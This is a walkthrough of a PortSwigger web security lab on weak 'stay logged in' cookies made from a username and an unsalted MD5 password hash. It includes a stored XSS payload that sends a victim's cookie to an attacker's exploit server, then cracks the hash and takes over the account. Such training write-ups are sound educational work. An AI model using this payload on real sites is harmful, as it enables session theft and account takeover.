## Offline password cracking

**Title:** Offline password cracking. [Go](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

**Description:** 

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

## Preface

A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in".

This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie. As possessing this cookie effectively allows you to bypass the entire login process, it is best practice for this cookie to be impractical to guess. However, some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp. Some even use the password as part of the cookie. This approach is particularly dangerous if an attacker is able to create their own account because they can study their own cookie and potentially deduce how it is generated. Once they work out the formula, they can try to brute-force other users' cookies to gain access to their accounts.

Some websites assume that if the cookie is encrypted in some way it will not be guessable even if it does use static values. While this may be true if done correctly, naively "encrypting" the cookie using a simple two-way encoding like Base64 offers no protection whatsoever. Even using proper encryption with a one-way hash function is not completely bulletproof. If the attacker is able to easily identify the hashing algorithm, and no salt is used, they can potentially brute-force the cookie by simply hashing their wordlists. This method can be used to bypass login attempt limits if a similar limit isn't applied to cookie guesses. 

Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. Using the usual techniques, such as XSS, an attacker could steal another user's "remember me" cookie and deduce how the cookie is constructed from that. If the website was built using an open-source framework, the key details of the cookie construction may even be publicly documented.

In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed. Hashed versions of well-known password lists are available online, so if the user's password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. This demonstrates the importance of salt in effective encryption. 

## Methodology

### Finding the vulnerable parameter

While solving this lab we are interested in `stay-logged-in` cookie parameter.

### My thought

With Burp running, we logged in to our own account to investigate the "Stay logged in" functionality. We noticed that the `stay-logged-in` cookie is Base64 encoded. In the Proxy > HTTP history tab, going to the Response to our login request and highlight the stay-logged-in cookie, to see that it is constructed as follows: `username+':'+md5HashOfPassword`. We now need to steal the victim user's cookie. Lab description says that the comment functionality is vulnerable to cross site scripting. Go to the exploit server and make a note of the URL. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID: `<script>document.location='//OUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>` On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie. Decode the cookie in Burp Decoder. The result will be `carlos:26323c16d5f4dabff3bb136f2460a943`. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`. Again we 
used [Crackstation](https://crackstation.net/) to crack the password.

Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.
